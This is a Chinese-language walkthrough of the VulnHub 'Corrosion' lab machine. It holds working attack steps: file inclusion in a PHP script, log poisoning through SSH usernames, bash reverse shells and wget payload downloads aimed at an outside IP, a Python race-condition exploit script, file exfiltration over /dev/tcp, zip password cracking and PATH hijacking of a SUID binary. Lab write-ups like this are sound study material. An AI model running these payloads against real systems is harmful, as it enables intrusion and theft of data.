# Corrosion
###### tags: `vulnhub`
> URL : https://www.vulnhub.com/entry/corrosion-1,730/

IP : 35.229.145.176

## Recon
- 掃 Port
    - `rustscan -a 35.229.145.176 -r 1-65535`
        - ![](https://i.imgur.com/Wo4QJYS.png)
    - `nmap -A -p80,22 35.229.145.176`
        - ![](https://i.imgur.com/5c5j1F1.png)
- 掃路徑
    - `python3 dirsearch.py -u 35.229.145.176`
        - 只掃到 `/tasks/`
            - 裡面有一個 todo list
            - ![](https://i.imgur.com/oOy5dSC.png)
    - 換不同的 dict
        - `python3 dirsearch.py -u http://35.229.145.176/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt`
            - 掃到 `/blog-post`
            - ![](https://i.imgur.com/4sZ5IqG.png)
            - http://35.229.145.176/blog-post/
    - 繼續掃
        - `python3 dirsearch.py -u http://35.229.145.176/blog-post/`
            - 找到 archives
            - ![](https://i.imgur.com/fmPKUZx.png)
            - 裡面有一個 php
                - ![](https://i.imgur.com/2iwQc9I.png)
## LFI 2 RCE

- 通靈到可以用 `?file` 來做 LFI
    - http://35.229.145.176/blog-post/archives/randylogs.php?file=php://filter/convert.base64-encode/resource=randylogs.php
        - `PD9waHAKICAgJGZpbGUgPSAkX0dFVFsnZmlsZSddOwogICBpZihpc3NldCgkZmlsZSkpCiAgIHsKICAgICAgIGluY2x1ZGUoIiRmaWxlIik7CiAgIH0KICAgZWxzZQogICB7CiAgICAgICBpbmNsdWRlKCJpbmRleC5waHAiKTsKICAgfQogICA/Pgo=`
    ```php
    <?php
       $file = $_GET['file'];
       if(isset($file))
       {
           include("$file");
       }
       else
       {
           include("index.php");
       }
       ?>
    ```
    - http://35.229.145.176/blog-post/archives/randylogs.php?file=../../../../../../../etc/passwd
        - ![](https://i.imgur.com/R4eyfsj.png)
- 根據題目提示說 `auth.log` 沒關
    - http://35.229.145.176/blog-post/archives/randylogs.php?file=../../../../../../../var/log/auth.log
        - ![](https://i.imgur.com/ZZs7AiW.png)
- `auth.log` 會把 ssh 登入的帳號給紀錄
    - `ssh 'meow@35.229.145.176'`
    - ![](https://i.imgur.com/dQTQax3.png)
    - ![](https://i.imgur.com/FORTuYq.png)

- 寫 phpinfo
    - `ssh '<?php phpinfo(); ?>@35.229.145.176'`
    - ![](https://i.imgur.com/R6Oj5ji.png)
    - ![](https://i.imgur.com/h0DYbcB.png)

- 寫 shell
    - `ssh '<?php system($_GET[A]) ?>@35.229.145.176'`
    - ![](https://i.imgur.com/9QroaCb.png)
    - `http://35.229.145.176/blog-post/archives/randylogs.php?file=../../../../../../../var/log/auth.log&A=id`
    - ![](https://i.imgur.com/2yF8Lz0.png)
- 戳 reverse shell
    - `bash -c 'bash -i >& /dev/tcp/35.201.246.140/7877 0>&1'`
    - `wget 35.201.246.140:8000/s`
    - http://35.229.145.176/blog-post/archives/randylogs.php?file=../../../../../../../var/log/auth.log&A=wget%2035.201.246.140:8000/s -O /tmp/s
    - ![](https://i.imgur.com/2xSNqry.png)
    - http://35.229.145.176/blog-post/archives/randylogs.php?file=../../../../../../../var/log/auth.log&A=bash /tmp/s
    - ![](https://i.imgur.com/V2XrGag.png)
- 補充，喵策會解法，LFI 無限制 RCE (PHP_SESSION_UPLOAD_PROGRESS)
```python
import grequests
sess_name = 'meowmeow'
sess_path = f'/var/lib/php/sessions/sess_{sess_name}'
base_url = 'http://35.229.145.176/blog-post/archives/randylogs.php'
param = "file"

# code = "file_put_contents('/tmp/shell.php','<?php system($_GET[a])');"
code = '''system("bash -c 'bash -i >& /dev/tcp/{domain}/{port} 0>&1'");'''

while True:
    req = [grequests.post(base_url,
                          files={'f': "A"*0xffff},
                          data={'PHP_SESSION_UPLOAD_PROGRESS': f"pwned:<?php {code} ?>"},
                          cookies={'PHPSESSID': sess_name}),
           grequests.get(f"{base_url}?{param}={sess_path}")]

    result = grequests.map(req)
    if "pwned" in result[1].text:
        print(result[1].text)
        break

```

## 進入 Shell
- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- 直接 sudo -l 嘗試提權
    - ![](https://i.imgur.com/v856hnz.png)
    - 需要密碼
- 準備 LinEnum
    - `wget 35.201.246.140:8000/LinEnum.sh`
    - ![](https://i.imgur.com/d0rOVig.png)
    - ![](https://i.imgur.com/NyhfvRT.png)
- 找到一個可疑檔案有 SGID
    - ![](https://i.imgur.com/NYy5aQ8.png)
    - ![](https://i.imgur.com/PjBtD0H.png)
    - ![](https://i.imgur.com/aLBAm1b.png)
- 傳出可疑檔案分析
    - 本機 `nc -l -p 1234 > write.ul`
    - 靶機 `cat /usr/bin/write.ul > /dev/tcp/35.201.246.140/1234`
        - ![](https://i.imgur.com/WoDsBaW.png)
    - 用 IDA 觀察
        - ![](https://i.imgur.com/HTQsyCy.png)
        - 看起來不像是需要逆的東西 QQ
        - 再繼續觀察
- 準備 Linpeas
    - ![](https://i.imgur.com/xczbBqr.png)
    - ![](https://i.imgur.com/Kj5SEXW.png)
- 找到備份檔案
    - ![](https://i.imgur.com/6RuyyKX.png)
    - 裡面有密碼
        - ![](https://i.imgur.com/oGU2Pig.png)
    - 傳出來
        - `cat user_backup.zip > /dev/tcp/35.201.246.140/1234`
- 用約翰爆破 zip
    - `zip2john  user_backup.zip > j`
    - `john j --wordlist=/opt/rockyou.txt`
        - ![](https://i.imgur.com/lGqxlAl.png)
        - 取得密碼為 `!randybaby`
- 解壓縮，取得密碼
    - ![](https://i.imgur.com/V6uLlD0.png)
    - ![](https://i.imgur.com/5fcJmBT.png)
    - `randylovesgoldfish1998`

- 透過 ssh 登入
    - 帳號 `randy`
    - 密碼 ``randylovesgoldfish1998`
- 取得 userflag
    - ![](https://i.imgur.com/mU3HKnB.png)

## 二次提權
- `sudo -l` 起手式
    - ![](https://i.imgur.com/ErcO50H.png)
    - 觀察先前壓縮檔中的程式
        - ![](https://i.imgur.com/OkOjUSq.png)
        - 因為他是 sudo 所以無法做 path 的汙染QQ
- 觀察檔案權限
    - ![](https://i.imgur.com/FTG4wPy.png)
    - 發現他有 suid，所以不用sudo
        - 就可以用 PATH 汙染 `cat` 了!
    - `echo "bash -c 'bash -i >& /dev/tcp/35.201.246.140/7878 0>&1'" > cat`
    - `chmod +x cat`
    - `PATH=/home/randy/fakepath:$PATH /home/randy/tools/easysysinfo`
- 收 reverse shell
    - ![](https://i.imgur.com/gDvDTRs.png)
- 取得 root flag
    - ![](https://i.imgur.com/VArwk2F.png)

## 心得
學到了喵策會的 LFI 大絕招 ； 除了 sudo 外還要在意 SUID，看樣子常常忘東忘西可能要來準備 Check list 了QQ